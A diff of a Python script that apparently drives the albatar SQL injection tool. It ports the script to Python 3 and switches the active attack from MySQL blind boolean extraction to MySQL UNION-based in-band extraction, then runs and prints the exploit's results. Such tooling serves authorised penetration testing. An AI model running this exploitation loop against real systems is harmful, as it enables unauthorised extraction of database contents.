@@ -1,10 +1,10 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 from albatar import *
+from urllib.parse import quote_plus
 import re
-from urllib import quote_plus
 
-PROXIES = {}#'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
+PROXIES = {}#'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 HEADERS = ['User-Agent: Mozilla/5.0']
 
 def test_state_grep(headers, body, time):
@@ -285,11 +285,11 @@ def oracle_boolean():
 
 # }}}
 
-#sqli = MySQL_Inband(mysql_union())
+sqli = MySQL_Inband(mysql_union())
 #sqli = MySQL_Inband(mysql_error())
 #sqli = MySQL_Blind(mysql_boolean())
 #sqli = MySQL_Blind(mysql_boolean_regexp())
-sqli = MySQL_Blind(mysql_boolean_binary())
+#sqli = MySQL_Blind(mysql_boolean_binary())
 #sqli = MySQL_Blind(mysql_time())
 
 #sqli = MSSQL_Inband(mssql_union())
@@ -302,6 +302,6 @@ sqli = MySQL_Blind(mysql_boolean_binary())
 #sqli = Oracle_Blind(oracle_boolean())
 
 for r in sqli.exploit():
-  print r
+  print(r)
 
 # vim: ts=2 sw=2 sts=2 et fdm=marker
